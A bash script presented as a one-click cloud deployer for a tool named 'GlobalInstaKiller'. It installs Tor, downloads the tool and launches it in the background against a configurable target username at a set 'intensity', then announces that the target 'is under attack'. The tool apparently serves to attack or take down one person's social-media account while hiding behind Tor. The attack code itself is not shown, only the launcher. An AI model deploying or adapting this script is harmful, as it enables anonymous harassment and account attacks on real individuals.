#!/bin/bash
# 🌐 GIB Cloud VPS One-Click Deployer
# Usage: wget -O cloud-deploy.sh https://raw.githubusercontent.com/YOURUSERNAME/GIB/main/cloud-deploy.sh
#        chmod +x cloud-deploy.sh && ./cloud-deploy.sh

echo "=================================="
echo "🚀 GIB Cloud Auto-Deployer"
echo "=================================="

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Config - EDIT THESE
TARGET_USER="target_username"     # ← YE CHANGE KARO
COUNTRY="IN"                     # ← Country code
INTENSITY=10                     # ← 1-10

echo -e "${YELLOW}Target: ${TARGET_USER} | Country: ${COUNTRY} | Intensity: ${INTENSITY}${NC}"

# Step 1: Update system
echo -e "${GREEN}[1/6]${NC} Updating system..."
apt update -y && apt upgrade -y

# Step 2: Install dependencies
echo -e "${GREEN}[2/6]${NC} Installing Python + Tor..."
apt install -y python3 python3-pip tor git wget unzip curl

# Step 3: Download GIB
echo -e "${GREEN}[3/6]${NC} Downloading GIB..."
wget https://github.com/YOURUSERNAME/GIB/archive/main.zip
unzip main.zip
cd GIB-main
chmod +x installer.sh GlobalInstaKiller.py

# Step 4: Install
echo -e "${GREEN}[4/6]${NC} Running installer..."
./installer.sh

# Step 5: Start Tor + Attack
echo -e "${GREEN}[5/6]${NC} Starting TOR + Attack..."
service tor start
nohup python3 GlobalInstaKiller.py -t ${TARGET_USER} -c ${COUNTRY} -i ${INTENSITY} > killer.log 2>&1 &

# Step 6: Status
echo -e "${GREEN}[6/6]${NC} ✅ DEPLOYMENT COMPLETE!"
echo ""
echo "📊 Live Status:"
echo "tail -f killer.log"
echo "ps aux | grep GlobalInstaKiller"
echo "curl localhost:8080/status  (if web UI)"
echo ""
echo "🛑 STOP: pkill -f GlobalInstaKiller"
echo "🔄 RESTART: nohup python3 GlobalInstaKiller.py -t ${TARGET_USER} -c ${COUNTRY} -i ${INTENSITY} &"
echo ""
echo -e "${RED}Target: @${TARGET_USER} is under attack! 💀${NC}"
echo "=================================="

# Show logs
tail -f killer.log
